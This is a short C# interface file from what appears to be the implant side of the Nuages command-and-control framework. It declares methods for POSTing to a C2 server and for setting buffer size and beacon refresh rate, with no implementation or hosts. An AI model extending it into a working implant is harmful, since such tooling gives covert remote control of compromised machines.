namespace NuagesSharpImplant
{
    public interface NuagesC2Connection
    {
        string POST(string url, string jsonContent);

        string getConnectionString();

        string getHandler();

        int getBufferSize();

        int getRefreshRate();

        void setRefreshRate(int refreshrate);

        void setBufferSize(int buffersize);
    }
}
